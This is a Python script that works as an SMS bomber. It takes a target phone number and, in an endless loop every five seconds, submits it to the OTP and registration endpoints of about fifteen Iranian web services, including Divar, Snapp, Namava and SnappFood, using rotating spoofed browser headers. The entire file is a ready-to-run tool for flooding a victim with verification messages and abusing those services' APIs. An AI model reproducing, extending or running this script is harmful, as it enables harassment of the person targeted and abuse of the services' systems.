import json , random ,time,requests
import sys,os
#---------headers------------------------------------
heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
random_head=random.choice(heads)
num = input('enter number[98-0] : ')
#------------urls-----------------------
divar_url = 'https://api.divar.ir/v5/auth/authenticate'
snap_url= 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
namava_url = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
tapsi_url = 'https://tap33.me/api/v2/user'
dr_url = 'https://drdr.ir/api/registerEnrollment/verifyMobile'
tam_url ='https://1401api.tamland.ir/api/user/signup'
food_url ='https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=03451ca3-3417-4c06-840a-f748c4e98930&locale=fa'
url_offch = 'https://api.offch.com/auth/otp'
delino_url ='https://www.delino.com/user/register'
tal_url="https://rest.talentcoach.ir/api/v1/service/trainees/"
tik_url="https://tikban.com/Account/LoginAndRegister"
a_url="https://gateway.filmgardi.com/shenaseh/api/v2/auth/step-one"
itol_url="https://app.itoll.ir/api/v1/auth/login"
behtar_url="https://api.behtarino.com/api/v1/businesses/mqdbicdbmb/vitrin_verification/"
pezsh_url="https://api.pezeshket.com/core/v1/auth/requestCode"



#------------data------------------------
number_divar = {"phone":num}
number_snap ={"cellphone":num}
number_namava = {"UserName":num}
number_tapsi = {"credential":{"phoneNumber": num,"role":"DRIVER"}}
number_food = {"cellphone":"+98"+num}
number_tam ={"Mobile":num,"SchoolId":-1}
number_dr = {"phoneNumber":'0'+num,"userType":"PATIENT"}
number_offch ={"username":"0"+num}
number_delino ={"mobile":"0"+num}
number_tal= {"cellphone":"+98"+num}
number_tik= {"phoneNumberCode":"+98","CellPhone":"0"+num,"CaptchaKey":"JustMobilephone"+num}
number_a= {"code":"98","phone":num,"smsStatus":"default"}
number_itol= {"mobile":"0"+num}
number_behtar= {"phone":num,"resend":True}
number_pezsh={"mobileNumber":num}
#------------------sender-------------------------
while True :
    divar_send = requests.post(divar_url,json=number_divar,headers=random_head)
    print('------------')  
    print('divar : ' )
    print(divar_send)
    print('------------')
    snap_send = requests.post(snap_url,data=number_snap,headers=random_head)
    print('snap : ')
    print(snap_send)
    print('------------')
    namava_send = requests.post(namava_url,json=number_namava,headers=random_head)
    print('namava :')
    print(namava_send)
    print('------------')
    tapsi_send = requests.post(tapsi_url,json=number_tapsi,headers=random_head)
    print('tapsi :')
    print(tapsi_send)
    print('------------')
    #dr_send = requests.post(dr_url,json=number_dr,headers=random_head)
    #print('dr send : ')
    #print('------------')
    #print(dr_send)
    dr_send = requests.post(dr_url,data=number_dr,headers=random_head)
    print('dr :')
    print(dr_send)
    print('------------')
    tam_send = requests.post(tam_url,json=number_tam,headers=random_head)
    print('Tam Land : ')
    print(tam_send)
    print('------------')
    food_send = requests.post(food_url,data=number_food,headers=random_head)
    print('snap food: ')
    print(food_send)
    print('------------')
    offch_send = requests.post(url_offch,data=number_offch,headers=random_head)
    print('offch : ')
    print(offch_send)
    print('------------')
    delino_send = requests.post(delino_url,data=number_delino,headers=random_head)
    print('delino : ')
    print(delino_send)
    print('------------')
    tal_send = requests.post(tal_url,data=number_tal,headers=random_head)
    print('talent :')
    print(tal_send)
    print('------------')
    tik_send = requests.post(tik_url,data=number_tik,headers=random_head)
    print('tikban :')
    print(tik_send)
    print('------------')
    a_send = requests.post(a_url,data=number_a,headers=random_head)
    print('getway :')
    print(a_send)
    print('------------')
    itol_send = requests.post(itol_url,data=number_itol,headers=random_head)
    print('itol :')
    print(itol_send)
    print('------------')
    behtar_send = requests.post(behtar_url,data=number_behtar,headers=random_head)
    print('behtarino :')
    print(behtar_send)
    print('------------')
    pezshl_send = requests.post(pezsh_url,data=number_pezsh,headers=random_head)
    print('peshk :')
    print(pezshl_send)
    print('------------')
    time.sleep(5) 